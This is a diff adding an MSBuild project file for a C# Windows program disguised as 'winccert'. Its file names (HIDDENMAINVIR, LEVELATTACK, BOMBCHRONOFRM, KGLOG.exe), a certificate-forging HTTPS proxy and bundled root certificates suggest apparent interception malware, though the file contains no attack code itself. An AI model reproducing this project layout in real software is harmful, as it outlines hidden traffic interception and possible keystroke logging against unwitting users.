@@ -1,0 +1,167 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="3.5" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProductVersion>9.0.21022</ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{0BC27648-E29F-4CF2-A68E-063279D602CF}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>SDV</RootNamespace>
+    <AssemblyName>winccert</AssemblyName>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <StartupObject>SDV.SDVC</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.configuration" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="BOMBCHRONOFRM.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="BOMBCHRONOFRM.Designer.cs">
+      <DependentUpon>BOMBCHRONOFRM.cs</DependentUpon>
+    </Compile>
+    <Compile Include="CLASS\Proxy\BasePipe.cs" />
+    <Compile Include="CLASS\Proxy\CalculateReportHandler.cs" />
+    <Compile Include="CLASS\Proxy\CertMaker.cs" />
+    <Compile Include="CLASS\Proxy\ClientChatter.cs" />
+    <Compile Include="CLASS\Proxy\CONFIG.cs" />
+    <Compile Include="CLASS\Proxy\DefaultCertificateProvider.cs" />
+    <Compile Include="CLASS\Proxy\DNSResolver.cs" />
+    <Compile Include="CLASS\Proxy\frmPrompt.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CLASS\Proxy\HostList.cs" />
+    <Compile Include="CLASS\Proxy\HTTPHeaderItem.cs" />
+    <Compile Include="CLASS\Proxy\HTTPHeaderParseWarnings.cs" />
+    <Compile Include="CLASS\Proxy\HTTPHeaders.cs" />
+    <Compile Include="CLASS\Proxy\HTTPRequestHeaders.cs" />
+    <Compile Include="CLASS\Proxy\HTTPResponseHeaders.cs" />
+    <Compile Include="CLASS\Proxy\HTTPSClientHello.cs" />
+    <Compile Include="CLASS\Proxy\HTTPSServerHello.cs" />
+    <Compile Include="CLASS\Proxy\HTTPSTunnel.cs" />
+    <Compile Include="CLASS\Proxy\Interfaces.cs" />
+    <Compile Include="CLASS\Proxy\KProxyApplication.cs" />
+    <Compile Include="CLASS\Proxy\KProxyCoreStartupFlags.cs" />
+    <Compile Include="CLASS\Proxy\KProxyTranscoders.cs" />
+    <Compile Include="CLASS\Proxy\NotificationEventArgs.cs" />
+    <Compile Include="CLASS\Proxy\Parser.cs" />
+    <Compile Include="CLASS\Proxy\PeriodicWorker.cs" />
+    <Compile Include="CLASS\Proxy\PipePool.cs" />
+    <Compile Include="CLASS\Proxy\PipeReusePolicy.cs" />
+    <Compile Include="CLASS\Proxy\PrefChangeEventArgs.cs" />
+    <Compile Include="CLASS\Proxy\PreferenceBag.cs" />
+    <Compile Include="CLASS\Proxy\ProcessHelper.cs" />
+    <Compile Include="CLASS\Proxy\ProfferFormatAttribute.cs" />
+    <Compile Include="CLASS\Proxy\ProgressCallbackEventArgs.cs" />
+    <Compile Include="CLASS\Proxy\Proxy.cs" />
+    <Compile Include="CLASS\Proxy\ProxyBypassList.cs" />
+    <Compile Include="CLASS\Proxy\ProxyExecuteParams.cs" />
+    <Compile Include="CLASS\Proxy\RASInfo.cs" />
+    <Compile Include="CLASS\Proxy\RawReadEventArgs.cs" />
+    <Compile Include="CLASS\Proxy\RequiredVersionAttribute.cs" />
+    <Compile Include="CLASS\Proxy\ServerChatter.cs" />
+    <Compile Include="CLASS\Proxy\ServerPipe.cs" />
+    <Compile Include="CLASS\Proxy\Session.cs" />
+    <Compile Include="CLASS\Proxy\SessionFlags.cs" />
+    <Compile Include="CLASS\Proxy\SessionStateHandler.cs" />
+    <Compile Include="CLASS\Proxy\SessionStates.cs" />
+    <Compile Include="CLASS\Proxy\SessionTimers.cs" />
+    <Compile Include="CLASS\Proxy\SimpleEventHandler.cs" />
+    <Compile Include="CLASS\Proxy\StateChangeEventArgs.cs" />
+    <Compile Include="CLASS\Proxy\TranscoderTuple.cs" />
+    <Compile Include="CLASS\Proxy\URLMonInterop.cs" />
+    <Compile Include="CLASS\Proxy\Utilities.cs" />
+    <Compile Include="CLASS\Proxy\ValidateServerCertificateEventArgs.cs" />
+    <Compile Include="CLASS\Proxy\VersionStruct.cs" />
+    <Compile Include="CLASS\Proxy\WinHTTPAutoProxy.cs" />
+    <Compile Include="CLASS\Proxy\WinHTTPNative.cs" />
+    <Compile Include="CLASS\Proxy\WinINETCache.cs" />
+    <Compile Include="CLASS\Proxy\WinINETConnectoid.cs" />
+    <Compile Include="CLASS\Proxy\WinINETConnectoids.cs" />
+    <Compile Include="CLASS\Proxy\WinINETProxyInfo.cs" />
+    <Compile Include="CLASS\Proxy\Winsock.cs" />
+    <Compile Include="DigitalClockCtrl.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="DigitalDisplay.cs" />
+    <Compile Include="HIDDENMAINVIR.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HIDDENMAINVIR.Designer.cs">
+      <DependentUpon>HIDDENMAINVIR.cs</DependentUpon>
+    </Compile>
+    <Compile Include="LEVELATTACK.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="TOOLS.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="BOMBCHRONOFRM.resx">
+      <DependentUpon>BOMBCHRONOFRM.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="DigitalClockCtrl.resx">
+      <DependentUpon>DigitalClockCtrl.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="HIDDENMAINVIR.resx">
+      <DependentUpon>HIDDENMAINVIR.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\BOMB.wav" />
+    <None Include="Resources\Root.crt" />
+    <None Include="Resources\sdv.pfx" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\makecert.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\WKDV.png" />
+    <None Include="Resources\MSGB.exe" />
+    <None Include="Resources\KGLOG.exe" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
